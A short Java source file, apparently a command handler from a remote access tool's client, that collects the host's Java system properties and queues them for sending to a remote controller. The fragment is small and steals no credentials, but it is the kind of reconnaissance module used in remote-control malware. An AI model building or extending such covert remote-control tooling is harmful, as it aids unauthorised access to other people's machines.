package com.redpois0n.packets;

import java.util.Set;

import com.redpois0n.Connection;


public class PacketJVM extends Packet {

	@Override
	public void read(String line) throws Exception {
		Set<Object> keys = System.getProperties().keySet();
		for (Object obj : keys) {
			if (obj.toString().toLowerCase().startsWith("java")) {
				Connection.addToSendQueue(new PacketBuilder(Header.JAVA_PROPERTIES, new String[] { obj.toString(), System.getProperty(obj.toString()) }));
			}
		}
	}

}